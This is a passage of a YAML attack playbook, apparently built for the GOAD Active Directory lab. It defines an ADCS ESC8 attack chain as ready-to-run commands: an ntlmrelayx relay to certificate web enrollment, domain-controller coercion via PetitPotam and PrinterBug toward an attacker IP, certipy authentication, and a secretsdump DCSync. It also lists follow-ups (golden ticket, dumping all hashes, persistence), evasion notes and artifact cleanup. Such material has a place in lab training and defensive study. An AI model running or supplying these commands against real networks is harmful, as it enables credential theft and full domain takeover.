        cmd: "rm -f *.pfx *.ccache"

  - id: adcs_esc8
    name: ADCS ESC8 — HTTP Relay to Web Enrollment
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_IP
      - ATTACKER_IP
    requires_priv: null
    tags:
      - adcs
      - esc8
      - relay
      - web-enrollment
      - coerce
    description: >
      ESC8: ADCS Web Enrollment (HTTP) is vulnerable to NTLM relay.
      Coerce DC authentication via PetitPotam or PrinterBug and relay to
      ADCS web enrollment to get a DC certificate — then DCSync.
      GOAD's ESSOS CA has ESC8 enabled.
    commands:
      - label: "Step 1 — Start relay to ADCS web enrollment"
        cmd: "impacket-ntlmrelayx -t http://{CA_IP}/certsrv/certfnsh.asp --adcs --template DomainController --no-http-server --smb2support"
      - label: "Step 2a — Coerce DC via PetitPotam"
        cmd: "python3 PetitPotam.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: "Step 2b — Coerce DC via PrinterBug"
        cmd: "python3 printerbug.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} {ATTACKER_IP}"
      - label: "Step 3 — Authenticate with DC certificate"
        cmd: "certipy auth -pfx dc.pfx -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with DC machine hash"
        cmd: "impacket-secretsdump -hashes :{NTLM_HASH} '{DOMAIN}/DC01$'@{DC_IP} -just-dc"
    next:
      - Extract KRBTGT hash for golden ticket
      - Dump all domain hashes
      - Establish domain persistence
    opsec: >
      Coercion is detectable on network monitoring. Relay leaves HTTP logs on
      CA server. Cert authentication to DC generates events. Use quickly.
    cleanup:
      - label: "Remove certificate and ticket files"
        cmd: "rm -f dc.pfx dc.ccache"

